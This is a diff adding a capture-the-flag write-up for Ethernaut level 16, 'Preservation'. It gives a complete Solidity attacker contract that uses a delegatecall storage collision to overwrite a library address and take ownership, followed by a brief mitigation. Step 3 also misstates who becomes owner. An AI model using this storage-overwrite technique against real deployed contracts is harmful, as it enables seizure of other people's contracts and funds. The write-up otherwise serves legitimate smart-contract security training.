@@ -1,0 +1,64 @@
+---
+title: Level 16 - Preservation
+slug: level-16
+published: 05-24-2023
+lastEdited:
+imgSrc: /images/ethernaut/ethernaut16.svg
+---
+
+## Objectives
+
+1. Claim ownership of the contract.
+
+## Vulnerabilities
+
+### Delegatecall
+
+Calling into a contract with `delegatecall` gives full control over the the calling contract's storage values and balance. _Calling
+into untrusted contracts is very dangerous._ Changing the address of the library instance to the address of our hack contract gives us
+the ability to modify any storage values.
+
+## Exploit
+
+1. Write and deploy this hack contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Preservation.sol";
+
+contract PreservationHack {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+    uint storedTime;
+
+    Preservation target;
+
+    constructor(address _targetAddress){
+        target = Preservation(_targetAddress);
+    }
+
+    function attack() public {
+        target.setFirstTime(uint(uint160(address(this))));
+    }
+
+    function setTime(uint _time) public {
+        owner = msg.sender;
+    }
+}
+```
+
+2. Call the `attack` function which will modify the first storage variable of the `Preservation` contract to the
+   address of ths `hack` contract.
+
+3. Call the `setFirstTime` function with any uint as input to modify the owner to the hack contract.
+
+## Suggested mitigation
+
+- Using stateless libraries prevent this type of exploit.
+
+## Further reading
+
+- Delegatecall exploits <ExternalLink href={"https://solidity-by-example.org/hacks/delegatecall/"} />
